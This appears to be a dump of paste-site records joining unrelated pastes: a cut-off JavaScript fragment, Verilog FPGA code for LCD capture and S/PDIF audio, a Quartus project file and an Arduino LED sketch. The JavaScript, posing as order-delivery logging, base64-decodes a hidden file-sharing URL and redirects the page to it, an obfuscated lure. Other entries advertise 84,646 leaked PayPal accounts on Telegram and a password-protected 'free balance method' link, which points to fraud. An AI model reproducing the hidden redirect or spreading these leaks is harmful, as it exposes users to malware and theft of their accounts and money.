        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NhGt7aRs,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 10:04:28 AM CDT,84646 Accounts Posted On https://t.me/leakzbyeminem
pYbgexbR,nisetroi.v,Killy728,VeriLog,Saturday 3rd of May 2025 10:00:49 AM CDT,"//`define DEBUG	//デバッグ時にコメントアウト

module nisetroi(FX2_SLOE, FX2_SLRD, FX2_SLWR, FX2_FD, FX2_FIFOADR, FX2_PKTEND,
		FX2_FLAGA, FX2_FLAGB, FX2_FLAGC, FX2_IFCLK,

		MODE, ADDR, RESET, DIR,
		CLK,Vsync, Hsync, LCDR1, LCDG1, LCDB1, LCDR2, LCDG2, LCDB2,   // 液晶データ
		SND_MCLK, SND_WS, SND_SDO, SOUT,                              // オーディオデータ
		);

//FX2信号定義
output FX2_SLOE;
output FX2_SLRD;
output FX2_SLWR;
inout  [7:0] FX2_FD;
output [1:0] FX2_FIFOADR;
output FX2_PKTEND;
input  FX2_FLAGA;
input  FX2_FLAGB;
input  FX2_FLAGC;
input  FX2_IFCLK;

`define	MODE_START	0	//サンプリング状態
`define	MODE_REGR	1	//レジスタ読み出し
`define	MODE_REGW	2	//レジスタ書き込み
`define MODE_IDLE	3	//停止状態

`define DIR_FX2PC 0
`define DIR_PC2FX 1
input   DIR;

input  [1:0] MODE;		//モード設定信号
input  [2:0] ADDR;		//レジスタ選択信号
input  RESET;			//リセット信号

input  CLK;				//dotクロック
input  [5:0] LCDR1;		//
input  [5:0] LCDG1;		//
input  [5:0] LCDB1;		//
input  [5:0] LCDR2;		//
input  [5:0] LCDG2;		//
input  [5:0] LCDB2;		//
input  Vsync, Hsync;

input  SND_MCLK;
input  SND_WS;
input  SND_SDO;
output SOUT;

wire  [7:0] reg_data;		//レジスタ読み出し信号
reg   [23:0] all_cnt;		//サンプリング数カウンタ
reg         screen;
reg         scboth;
reg   [1:0] f_skip;
reg         flip;

//レジスタ書き込み処理
always @(posedge FX2_IFCLK)
begin
	if((MODE == `MODE_REGW)&&(ADDR == 0)) begin
		screen   <= FX2_FD[2];
		scboth   <= FX2_FD[3];
		f_skip   <= FX2_FD[1:0];
	end
end

//レジスタ読み出し処理
assign reg_data = ((ADDR == 0)&&(DIR == `DIR_FX2PC)) ? all_cnt[7:0] :
                  ((ADDR == 1)&&(DIR == `DIR_FX2PC)) ? all_cnt[15:8] :
                  ((ADDR == 2)&&(DIR == `DIR_FX2PC)) ? all_cnt[23:16] :
                  ((ADDR == 3)&&(DIR == `DIR_FX2PC)) ? 0 :
                  ((ADDR == 4)&&(DIR == `DIR_FX2PC)) ? 0 :
                  ((ADDR == 5)&&(DIR == `DIR_FX2PC)) ? 0 :
                  ((ADDR == 6)&&(DIR == `DIR_FX2PC)) ? 0 :
                  ((ADDR == 7)&&(DIR == `DIR_FX2PC)) ? 0 :
                                                       0;

reg  [7:0] byte_data;

//サンプリングクロックとFX2クロック(48MHz)の間でデータを変換するために
//14セットのバッファを使用
reg  [5:0] datR [0:13], datG [0:13], datB [0:13];
reg  [1:0] sync [0:13];

wire lVsync;
reg  dVsync;
reg  [3:0] sw1;		//バッファ切り替えスイッチ
reg  [8:0] Pcnt;
reg  [4:0] Dcnt;
reg  [7:0] Lcnt;
reg  [1:0] Fcnt;
reg  Initskip;
reg  Hactive, Vactive, Factive;
wire Active;
reg  Vflag;
wire DCLK;
reg	 [3:0] CLKDELAY;
reg	 [3:0] VSYNCDELAY;
wire [3:0] sw1_0;
wire [3:0] sw1_1;


// Vsyncが長すぎるので短く切る
assign lVsync = (~Vsync) & (~VSYNCDELAY[3]);
always @( posedge DCLK ) begin
	VSYNCDELAY <= VSYNCDELAY << 1;
	VSYNCDELAY[0] <= Hactive;
end

// 48MHzのFX2_IFCLKを使用してCLKの周波数を２倍にする。
assign DCLK = CLK ^ CLKDELAY[3];
always @( posedge FX2_IFCLK ) begin
	CLKDELAY <= CLKDELAY << 1;
	CLKDELAY[0] <= CLK;
end

// 一発目のVsyncが来るまでデータを出力しない
always @( posedge lVsync or posedge RESET) begin
	if( RESET == 1 ) begin
		Initskip <= 0;
	end else begin
		Initskip <= 1;
	end
end

// １ライン(300ドット)の内、27～283ドットのデータのみ有効
always @( posedge DCLK or posedge Hsync ) begin

	if( Hsync == 1 ) begin
		Pcnt <= 0;
		Hactive <= 0;
	end else begin
		if( Initskip == 1) begin
			Pcnt <= Pcnt + 1'b1;
		end
		if( Pcnt == 27 ) begin
			Hactive <= 1;
		end else begin
			if( Pcnt == 283 ) begin
				Hactive <= 0;
			end
		end
	end

end

// １フレームの内、192ライン以降は無効
always @( posedge Hsync or posedge lVsync) begin
	if( lVsync == 1 ) begin
		Lcnt <= 0;
		Vactive <= 1;
	end else begin
		Lcnt <= Lcnt + 1'b1;
		if( Lcnt == 0 ) begin
			Vactive <= 1;
		end else begin
			if( Lcnt == 191 ) begin
				Vactive <= 0;
			end
		end
	end
end

// フレーム数カウントとフレームスキップ処理
always @( posedge lVsync or posedge RESET ) begin
	if( RESET == 1 ) begin	//RESET
		all_cnt <= 0;
		Factive <= 0;
	end else begin
		flip <= 1;
		all_cnt <= all_cnt + 1;	//

		if( Fcnt == 0 ) begin
			Factive <= 1;
		end else begin
			Factive <= 0;
		end

		if( Fcnt == f_skip ) begin
			Fcnt <= 0;
		end else begin
			Fcnt <= Fcnt + 1;		
		end
	end
end

assign Active = Hactive & Vactive & Factive & Initskip;

assign sw1_0 = { sw1[3:1], 1'b0 };
assign sw1_1 = { sw1[3:1], 1'b1 };

always @( posedge DCLK or posedge RESET) begin
	if( RESET == 1 ) begin
		sw1 <= 0;
	end else begin
		if(DIR == `DIR_FX2PC) begin
			if( ( MODE == `MODE_START ) && Active ) begin
				if ( scboth == 0 ) begin
					if ( screen == 0 ) begin
						begin				//バッファに格納
							datR[sw1] <= LCDR2;
							datG[sw1] <= LCDG2;
							datB[sw1] <= LCDB2;
							sync[sw1][1] <= lVsync;
							sync[sw1][0] <= 0;
						end

						if(sw1 ==  4'b1101)
							sw1 <= 0;
						else
							sw1 <= sw1 + 1;				//バッファスイッチ切り替え
					end else begin
						begin				//バッファに格納
							datR[sw1] <= LCDR1;
							datG[sw1] <= LCDG1;
							datB[sw1] <= LCDB1;
							sync[sw1][1] <= lVsync;
							sync[sw1][0] <= 1;
						end

						if(sw1 ==  4'b1101)
							sw1 <= 0;
						else
							sw1 <= sw1 + 1;				//バッファスイッチ切り替え
					end
				end else begin
					begin				//バッファに格納
						datR[sw1_0] <= LCDR2;
						datG[sw1_0] <= LCDG2;
						datB[sw1_0] <= LCDB2;
						sync[sw1_0][1] <= lVsync;
						sync[sw1_0][0] <= 0;

						datR[sw1_1] <= LCDR1;
						datG[sw1_1] <= LCDG1;
						datB[sw1_1] <= LCDB1;
						sync[sw1_1][1] <= lVsync;
						sync[sw1_1][0] <= 1;
					end

					begin
						if(sw1 >=  4'b1100)
							sw1 <= 0;
						else
							sw1 <= sw1 + 2;				//バッファスイッチ切り替え
					end
				end
			end
		end
	end
end

reg slwr;

reg [1:0] tcnt;			//1byteづつUSB転送するためのカウンタ
reg [3:0] tsw;			//USB転送するバッファスイッチ
reg [3:0] _sw;			//FX2クロックに同期させた、サンプルバッファスイッチ(SW)
reg [7:0] fifo_data;	//USB転送するデータ

//FX2メイン処理
always@ (posedge FX2_IFCLK or posedge RESET) begin
	if(RESET == 1) begin	//RESET信号による初期化
		tsw <= 0;
		tcnt <= 0;
		_sw <= 0;
	end else begin
		if( FX2_FLAGB == 1 ) begin
			_sw <= sw1;	//サンプリングクロックにより更新されるswをFX2クロックに同期
			if(tsw != _sw) begin	//サンプルデータが準備できているか？
				slwr <= 0;	//FX2のライト信号を有効
				fifo_data <= data_sel(tcnt, datR[tsw], datG[tsw], datB[tsw], sync[tsw]);
												 	//転送すべきデータをセット
				tcnt <= tcnt + 1;
				if(tcnt == 2) begin
					tcnt <= 0;
					if(tsw == 4'b1101)
						tsw <= 0;
					else
						tsw <= tsw + 1;				//転送バッファスイッチの更新
				end
			end
			else begin
				slwr <= 1;	//FX2のライト信号を無効
			end
		end else begin
			slwr <= 1;	//FX2のライト信号を無効
		end
//		if ( Active == 0 ) begin
//			FX2_PKTEND <= 1;
//		end else begin
//			FX2_PKTEND <= 0;
//		end
	end
end


//FX2で転送すべきデータ(1byte)をバッファから選択する
function [7:0] data_sel;
	input [1:0] tcnt;
	input [5:0] datR, datG, datB;
	input [1:0] sync;

	data_sel[7:6] = sync;
	
	case(tcnt)
		0: data_sel[5:0] = datR;
		1: data_sel[5:0] = datG;
		2: data_sel[5:0] = datB;
		3: data_sel[5:0] = 0;
	endcase
endfunction

assign FX2_SLOE = ((DIR == `DIR_PC2FX)&&(MODE == `MODE_START)) ? 0 : 1;
assign FX2_FIFOADR = (DIR == `DIR_FX2PC) ? 2 : 0;
assign FX2_PKTEND = 1;
//assign FX2_SLRD = slrd;
assign FX2_SLWR = slwr;
//FX2のfifoバスはMODE信号で適宜切り替える
assign FX2_FD = ((MODE == `MODE_REGW) || ((DIR == `DIR_PC2FX)&&(MODE == `MODE_START))) ? 8'bzzzzzzzz :
				(MODE == `MODE_REGR) ? reg_data    : fifo_data;

// I2S -> S/PDIF変換32kHz専用

reg  [7:0] MCLKCNT;
reg  [1:0] WSCHGCK;
reg  [15:0] SNDBUF [0:1];
wire       MCNTRST;
wire [3:0] MCNT_SDO;
wire       MCLK_SDO;
wire       MCLK128;
reg        SPDIF;
wire [5:0] MCNT_SPDIF;
reg  [7:0] FRMCNT;
reg        Channel;
reg        Parity;
wire       WS,nWS;

assign MCNTRST = WSCHGCK[0] ^ WSCHGCK[1];    // サブフレームのカウンタリセット信号
assign MCNT_SDO = MCLKCNT[6:3];
//assign MCNT64  = MCLKCNT[6:1];
assign MCLK128  = MCLKCNT[0];
assign MCLK_SDO = MCLKCNT[2];
assign MCNT_SPDIF = MCLKCNT[6:1];
assign SOUT    = SPDIF;
assign WS      = WSCHGCK[0];
assign nWS     = ~WSCHGCK[0];

// ワードクロック
always@ (posedge SND_MCLK )begin
	WSCHGCK <= WSCHGCK << 1;
	WSCHGCK[0] <= SND_WS;
end

always@ (negedge SND_MCLK or posedge MCNTRST )begin
	if ( MCNTRST == 1 )
		MCLKCNT <= 0;
	else
		MCLKCNT <= MCLKCNT + 1;
end

// フレーム数カウンタ
always@ ( posedge WS )begin
	if ( FRMCNT == 191 )
			FRMCNT <= 0;	
		else
			FRMCNT <= FRMCNT + 1;

// Channel bit作成
	case( FRMCNT )
		2,24,25,33:	Channel <= 1;
		default:	Channel <= 0;
	endcase
end

always@ (posedge MCLK_SDO ) begin
//	case( MCNT_SDO )
//		4'b0000:	SNDBUF[nWS][0] <= SND_SDO;
//		4'b0001:	SNDBUF[WS][15] <= SND_SDO;
//		4'b0010:	SNDBUF[WS][14] <= SND_SDO;
//		4'b0011:	SNDBUF[WS][13] <= SND_SDO;
//		4'b0100:	SNDBUF[WS][12] <= SND_SDO;
//		4'b0101:	SNDBUF[WS][11] <= SND_SDO;
//		4'b0110:	SNDBUF[WS][10] <= SND_SDO;
//		4'b0111:	SNDBUF[WS][9] <= SND_SDO;
//		4'b1000:	SNDBUF[WS][8] <= SND_SDO;
//		4'b1001:	SNDBUF[WS][7] <= SND_SDO;
//		4'b1010:	SNDBUF[WS][6] <= SND_SDO;
//		4'b1011:	SNDBUF[WS][5] <= SND_SDO;
//		4'b1100:	SNDBUF[WS][4] <= SND_SDO;
//		4'b1101:	SNDBUF[WS][3] <= SND_SDO;
//		4'b1110:	SNDBUF[WS][2] <= SND_SDO;
//		4'b1111:	SNDBUF[WS][1] <= SND_SDO;
//	endcase
  if( MCNT_SDO == 4'b0000 ) begin
    SNDBUF[nWS][0] <= SND_SDO;
  end else begin
	SNDBUF[WS] <= SNDBUF[WS] << 1;
	SNDBUF[WS][1] <= SND_SDO;
  end
end

// S/PDIFデータ作成
always@ (posedge MCLK128 )begin
	if( MCNT_SPDIF <= 7 ) begin               // Ｓｙｎｃ作成
		if( nWS == 0 ) begin
			if( FRMCNT == 0 ) begin
				case( MCNT_SPDIF )            // Ｂ １１１０１０００
					0:	SPDIF <= ~SPDIF;
					1:	SPDIF <= SPDIF;
					2:	SPDIF <= SPDIF;
					3:	SPDIF <= ~SPDIF;
					4:	SPDIF <= ~SPDIF;
					5:	SPDIF <= ~SPDIF;
					6:	SPDIF <= SPDIF;
					7:	SPDIF <= SPDIF;
				endcase
			end else begin
				case( MCNT_SPDIF )            // Ｍ １１１０００１０
					0:	SPDIF <= ~SPDIF;
					1:	SPDIF <= SPDIF;
					2:	SPDIF <= SPDIF;
					3:	SPDIF <= ~SPDIF;
					4:	SPDIF <= SPDIF;
					5:	SPDIF <= SPDIF;
					6:	SPDIF <= ~SPDIF;
					7:	SPDIF <= ~SPDIF;
				endcase
			end
		end else begin
			case( MCNT_SPDIF )            // Ｗ １１１００１００
				0:	SPDIF <= ~SPDIF;
				1:	SPDIF <= SPDIF;
				2:	SPDIF <= SPDIF;
				3:	SPDIF <= ~SPDIF;
				4:	SPDIF <= SPDIF;
				5:	SPDIF <= ~SPDIF;
				6:	SPDIF <= ~SPDIF;
				7:	SPDIF <= SPDIF;
			endcase
		end
	end else begin                             // データ部分作成
		if ( MCNT_SPDIF[0] == 0 ) begin
			SPDIF <= ~SPDIF;
		end else begin
			case( MCNT_SPDIF )
//				6'b001001:	SPDIF <= SPDIF ^ 0;
//				6'b001011:	SPDIF <= SPDIF ^ 0;
//				6'b001101:	SPDIF <= SPDIF ^ 0;
//				6'b001111:	SPDIF <= SPDIF ^ 0;
//				6'b010001:	SPDIF <= SPDIF ^ 0;
//				6'b010011:	SPDIF <= SPDIF ^ 0;
//				6'b010101:	SPDIF <= SPDIF ^ 0;
//				6'b010111:	SPDIF <= SPDIF ^ 0;
				6'b011001:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][0];
						Parity <= SNDBUF[nWS][0];
					end
				6'b011011:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][1];
						Parity <= Parity + SNDBUF[nWS][1];
					end
				6'b011101:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][2];
						Parity <= Parity + SNDBUF[nWS][2];
					end
				6'b011111:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][3];
						Parity <= Parity + SNDBUF[nWS][3];
					end
				6'b100001:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][4];
						Parity <= Parity + SNDBUF[nWS][4];
					end
				6'b100011:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][5];
						Parity <= Parity + SNDBUF[nWS][5];
					end
				6'b100101:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][6];
						Parity <= Parity + SNDBUF[nWS][6];
					end
				6'b100111:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][7];
						Parity <= Parity + SNDBUF[nWS][7];
					end
				6'b101001:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][8];
						Parity <= Parity + SNDBUF[nWS][8];
					end
				6'b101011:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][9];
						Parity <= Parity + SNDBUF[nWS][9];
					end
				6'b101101:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][10];
						Parity <= Parity + SNDBUF[nWS][10];
					end
				6'b101111:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][11];
						Parity <= Parity + SNDBUF[nWS][11];
					end
				6'b110001:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][12];
						Parity <= Parity + SNDBUF[nWS][12];
					end
				6'b110011:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][13];
						Parity <= Parity + SNDBUF[nWS][13];
					end
				6'b110101:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][14];
						Parity <= Parity + SNDBUF[nWS][14];
					end
				6'b110111:
					begin
						SPDIF <= SPDIF ^ SNDBUF[nWS][15];
						Parity <= Parity + SNDBUF[nWS][15];
					end
//				6'b111001:	SPDIF <= SPDIF ^ 0;     	// V
//				6'b111011:	SPDIF <= SPDIF ^ 0;     	// U
				6'b111101:
					begin
						SPDIF <= SPDIF ^ Channel;	// C
						Parity <= Parity + Channel;
					end
				6'b111111:	SPDIF <= SPDIF ^ Parity;	// P
			endcase
		end
	end
end

endmodule
"
X9f9Vrff,nisetroi.qpf,Killy728,JSON,Saturday 3rd of May 2025 09:58:54 AM CDT,"# -------------------------------------------------------------------------- #
#
# Copyright (C) 1991-2009 Altera Corporation
# Your use of Altera Corporation's design tools, logic functions 
# and other software and tools, and its AMPP partner logic 
# functions, and any output files from any of the foregoing 
# (including device programming or simulation files), and any 
# associated documentation or information are expressly subject 
# to the terms and conditions of the Altera Program License 
# Subscription Agreement, Altera MegaCore Function License 
# Agreement, or other applicable license agreement, including, 
# without limitation, that your use is for the sole purpose of 
# programming logic devices manufactured by Altera and sold by 
# Altera or its authorized distributors.  Please refer to the 
# applicable agreement for further details.
#
# -------------------------------------------------------------------------- #
#
# Quartus II
# Version 9.1 Build 222 10/21/2009 SJ Full Version
# Date created = 16:36:02  May 09, 2010
#
# -------------------------------------------------------------------------- #

QUARTUS_VERSION = ""9.1""
DATE = ""16:36:02  May 09, 2010""

# Revisions

PROJECT_REVISION = ""nisetroi""
"
1LEAjcAU,two_button.ino,DrAungWinHtut,Arduino,Saturday 3rd of May 2025 09:57:27 AM CDT,"// C++ code using millis() instead of delay()

const int buttonPin1 = 2;
const int buttonPin2 = 3;
const int ledPins[] = {11, 12, 13};
const int numLeds = 3;

int count1 = 0;
int count2 = 0;
int buttonState1 = LOW;
int buttonState2 = LOW;
int lastButtonState1 = LOW;
int lastButtonState2 = LOW;

unsigned long lastDebounceTime1 = 0;
unsigned long lastDebounceTime2 = 0;
unsigned long debounceDelay = 50;

unsigned long lastBlinkTime = 0;
unsigned long blinkInterval = 500;
int blinkStep = 0;
bool blinkState = LOW;

void setup() {
  pinMode(buttonPin1, INPUT);
  pinMode(buttonPin2, INPUT);
  for (int i = 0; i < numLeds; i++) {
    pinMode(ledPins[i], OUTPUT);
  }
  Serial.begin(9600);
}

void loop() {
  // Button debouncing
  int reading1 = digitalRead(buttonPin1);
  if (reading1 != lastButtonState1) {
    lastDebounceTime1 = millis();
  }

  if ((millis() - lastDebounceTime1) > debounceDelay) {
    if (reading1 == HIGH && buttonState1 == LOW) {
      count1++;
      Serial.println(count1);
    }
    buttonState1 = reading1;
  }
  lastButtonState1 = reading1;
  Serial.print(count1%3);
  // Choose mode based on count
  switch (count1 % 3) {
    case 0:
      l2r();
      break;
    case 1:
      r2l();
      break;
    case 2:
      same_time();
      break;
  }
  
  
  int reading2 = digitalRead(buttonPin2);
  if (reading2 != lastButtonState2) {
    lastDebounceTime2 = millis();
  }

  if ((millis() - lastDebounceTime2) > debounceDelay) {
    if (reading2 == HIGH && buttonState1 == LOW) {
      count2++;
      Serial.println(count2);
    }
    buttonState2 = reading2;
  }
  lastButtonState2 = reading2;
  Serial.print(count2%3);
  // Choose mode based on count
  switch (count2 % 3) {
    case 0:
      blinkInterval = 500;	
      Serial.println("" - delay 500"");
      break;
    case 1:
      blinkInterval = 1000;	
      Serial.println("" - delay 1000"");	
      break;
    case 2:
      blinkInterval = 1500;	
      Serial.println("" - delay 1500"");
      break;
  }
}

void r2l() {
  Serial.println("" - R to L"");
  if (millis() - lastBlinkTime >= blinkInterval) {
    lastBlinkTime = millis();
    for (int i = 0; i < numLeds; i++) {
      digitalWrite(ledPins[i], LOW);
    }
    digitalWrite(ledPins[blinkStep], HIGH);
    blinkStep = (blinkStep + 1) % numLeds;
  }
}

void l2r() {
  Serial.println("" - L to R"");
  if (millis() - lastBlinkTime >= blinkInterval) {
    lastBlinkTime = millis();
    for (int i = 0; i < numLeds; i++) {
      digitalWrite(ledPins[i], LOW);
    }
    digitalWrite(ledPins[numLeds - 1 - blinkStep], HIGH);
    blinkStep = (blinkStep + 1) % numLeds;
  }
}

void same_time() {
  Serial.println("" - 3 LED"");
  if (millis() - lastBlinkTime >= blinkInterval) {
    lastBlinkTime = millis();
    blinkState = !blinkState;
    for (int i = 0; i < numLeds; i++) {
      digitalWrite(ledPins[i], blinkState ? HIGH : LOW);
    }
  }
}
"
rbX9ZCe1,Stake Free Balance Method,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 09:49:12 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 26629
